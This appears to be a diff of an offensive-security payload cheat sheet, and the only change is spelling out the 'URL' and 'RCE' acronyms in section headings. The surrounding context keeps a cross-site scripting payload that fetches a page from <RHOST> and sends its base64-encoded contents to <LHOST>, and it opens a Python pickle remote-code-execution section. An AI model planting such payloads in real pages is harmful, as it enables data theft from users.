@@ -39,7 +39,7 @@ x.send();
 
 ### JavaScript (JS)
 
-#### JavaScript (JS) Fetch URL and Base64 Encoding
+#### JavaScript (JS) Fetch Uniform Resource Locator (URL) and Base64 Encoding
 
 ```c
 <script>fetch('http://<RHOST>/auth.php').then(r => r.text()).then(d => fetch("http://<LHOST>"+btoa(d)));</script>
@@ -84,7 +84,7 @@ Connection: close
 
 ### Python
 
-#### Python Pickle RCE
+#### Python Pickle Remote Code Execution (RCE)
 
 ```python
 import pickle
